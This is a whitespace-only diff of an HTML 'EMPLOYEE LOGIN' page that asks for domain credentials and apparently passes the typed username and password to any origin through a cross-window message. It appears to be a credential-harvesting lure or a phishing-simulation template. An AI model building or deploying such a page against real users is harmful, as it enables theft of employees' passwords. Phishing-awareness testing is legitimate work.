@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-​
 <head>
     <title></title>
     <meta charset="utf-8">
@@ -8,8 +7,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-​
-    <script type="text/javascript">
+<script type="text/javascript">
         $(function () {
             $("#submit").click(function () {
                 if ($("#username").val() && $("#password").val()) {
@@ -24,9 +22,7 @@
                             }
                         })
                     }), '*');
-​
-​
-                    $('#custom :input').attr('disabled', 'disabled');
+            $('#custom :input').attr('disabled', 'disabled');
                     $('#custom').fadeTo("slow", 0.15, function () {
                         $(this).find(':input').attr('disabled', 'disabled');
                         $(this).find('label').css('cursor', 'default');
@@ -39,19 +35,14 @@
         })
     </script>
 </head>
-​
 <body style="background: #0077bd;">
-​
-​
-    <div class="container" style="padding: 0;" id="custom">
+<div class="container" style="padding: 0;" id="custom">
         <h3 style="color: #FFFFFF"><b>EMPLOYEE LOGIN</b></h3>
 		<h6 style="color: #0F0F0F"><b>*Use your domain credentials</b></h6>
         <div class="form-group" style="margin-top: 20px">
             <input type="text" class="form-control" id="username" placeholder="Username" name="email">
         </div>
-​
         <div class="form-group">
-​
             <input type="password" class="form-control" id="password" placeholder="Password" name="pwd">
         </div>
         <button id="submit" type="submit" class="btn btn-default" style="margin-top: 10px">Login</button>
@@ -60,5 +51,4 @@
             <ul id="add"></ul>
         </strong></center>
 </body>
-​
 </html>
